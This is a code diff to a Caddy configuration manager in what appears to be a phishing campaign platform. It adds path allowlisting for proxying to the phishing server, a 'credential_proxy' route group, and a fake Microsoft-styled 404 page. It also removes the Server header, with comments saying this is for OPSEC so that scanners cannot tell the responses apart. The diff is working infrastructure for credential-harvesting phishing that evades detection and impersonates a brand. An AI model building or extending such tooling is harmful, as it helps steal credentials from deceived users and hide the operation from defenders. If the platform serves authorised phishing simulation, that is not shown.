@@ -19,6 +19,40 @@ from cryptography.x509.oid import NameOID
 
 logger = logging.getLogger(__name__)
 
+# Paths that are always proxied to Flask for every inbound campaign.
+# /assets/* and /static/* are excluded — they're served by Caddy file_server
+# upstream and never reach the proxy subroute.
+PROXY_BASE_PATHS = ["/", "/health", "/favicon.ico", "/robots.txt"]
+
+# Optional path groups that can be enabled per-campaign.
+PROXY_PATH_GROUPS = {
+    "tracking": ["/track/*", "/js/*"],
+    "credential_proxy": ["/proxy-status/*", "/callback"],
+    "media": ["/m/*", "/media/*"],
+}
+
+# Inline default 404 page — matches phishing/routes.py DEFAULT_404_HTML
+# so Caddy 404s are indistinguishable from Flask 404s.
+DEFAULT_NOT_FOUND_HTML = """\
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page not found</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; margin: 50px; }
+        .container { max-width: 600px; }
+        h1 { color: #0078d4; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Page not found</h1>
+        <p>The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
+        <p><a href="https://www.microsoft.com">Return to Microsoft.com</a></p>
+    </div>
+</body>
+</html>"""
+
 
 class CaddySSLError(Exception):
     """SSL certificate related errors"""
@@ -311,6 +345,60 @@ class CaddyManager:
             logger.error(f"Failed to pre-render blocked template for campaign {campaign.uid}: {e}")
             return None
 
+    def _build_allowed_proxy_paths(self, campaign) -> List[str]:
+        """
+        Build the list of paths that should be proxied to Flask.
+
+        Combines the static base paths, the campaign's UID-scoped paths, and
+        any path groups enabled via campaign.allowed_proxy_groups.
+
+        Returns:
+            List of Caddy path matcher strings.
+        """
+        paths = list(PROXY_BASE_PATHS)
+
+        # UID-scoped routes — covers /{uid}/track/*, /{uid}/callback, etc.
+        if campaign.uid:
+            paths.extend([
+                f"/{campaign.uid}",
+                f"/{campaign.uid}/",
+                f"/{campaign.uid}/*",
+            ])
+
+        # Add paths for each enabled proxy group
+        groups = getattr(campaign, 'allowed_proxy_groups', []) or []
+        for group in groups:
+            if group in PROXY_PATH_GROUPS:
+                paths.extend(PROXY_PATH_GROUPS[group])
+
+        return paths
+
+    def _resolve_404_body(self, campaign) -> str:
+        """
+        Resolve the 404 response body for a campaign's Caddy config.
+
+        Priority:
+        1. campaign.config['custom_404_body'] — raw HTML
+        2. campaign.config['custom_404_template_id'] — pre-rendered template
+        3. DEFAULT_NOT_FOUND_HTML fallback
+
+        Returns:
+            HTML string for the 404 response body.
+        """
+        config = campaign.config or {}
+
+        custom_body = (config.get('custom_404_body') or '').strip()
+        if custom_body:
+            return custom_body
+
+        template_id = config.get('custom_404_template_id')
+        if template_id:
+            rendered = self._prerender_blocked_template(campaign, template_id=template_id)
+            if rendered is not None:
+                return rendered
+
+        return DEFAULT_NOT_FOUND_HTML
+
     def _build_gate_filter_subroute(self, campaign) -> Optional[Dict]:
         """
         Build a Caddy subroute that blocks requests without the gate token.
@@ -514,14 +602,15 @@ class CaddyManager:
         if gate_subroute:
             subroutes.append(gate_subroute)
 
-        # Proxy everything else to the phishing server
+        # Reverse proxy to the phishing server — only for allowed paths.
         # X-Forwarded-Proto: explicit so Flask sees correct scheme when Caddy is behind Cloudflare
         # (Caddy's default uses connection-to-Caddy, which is HTTP when Cloudflare uses Flexible SSL)
         proto = "https" if campaign.ssl_mode != "disabled" else "http"
         # When behind Cloudflare, ssl_mode may be disabled yet clients use HTTPS; prefer https
         if campaign.ssl_mode == "disabled" and campaign.custom_domain:
             proto = "https"
-        subroutes.append({
+
+        proxy_subroute = {
             "handle": [
                 {
                     "handler": "reverse_proxy",
@@ -540,7 +629,40 @@ class CaddyManager:
                     }
                 }
             ]
-        })
+        }
+
+        # Path allowlist — only proxy known-valid paths unless the global
+        # override is set.  Everything else gets a static 404 from Caddy,
+        # keeping scanner noise off the Flask server entirely.
+        from shared.database import Setting
+        proxy_all = Setting.get_setting('CADDY_PROXY_ALL_PATHS', False)
+        if not proxy_all:
+            allowed_paths = self._build_allowed_proxy_paths(campaign)
+            proxy_subroute["match"] = [{"path": allowed_paths}]
+
+        subroutes.append(proxy_subroute)
+
+        # 404 catch-all for paths not in the allowlist.
+        # Uses the campaign's custom 404 body for OPSEC consistency (so
+        # Caddy 404s are indistinguishable from Flask 404s to scanners).
+        if not proxy_all:
+            not_found_body = self._resolve_404_body(campaign)
+            subroutes.append({
+                "handle": [
+                    {
+                        "handler": "headers",
+                        "response": {"delete": ["Server"]}
+                    },
+                    {
+                        "handler": "static_response",
+                        "status_code": 404,
+                        "headers": {
+                            "Content-Type": ["text/html; charset=utf-8"]
+                        },
+                        "body": not_found_body
+                    }
+                ]
+            })
 
         # Build the host-matched route entry
         route = {
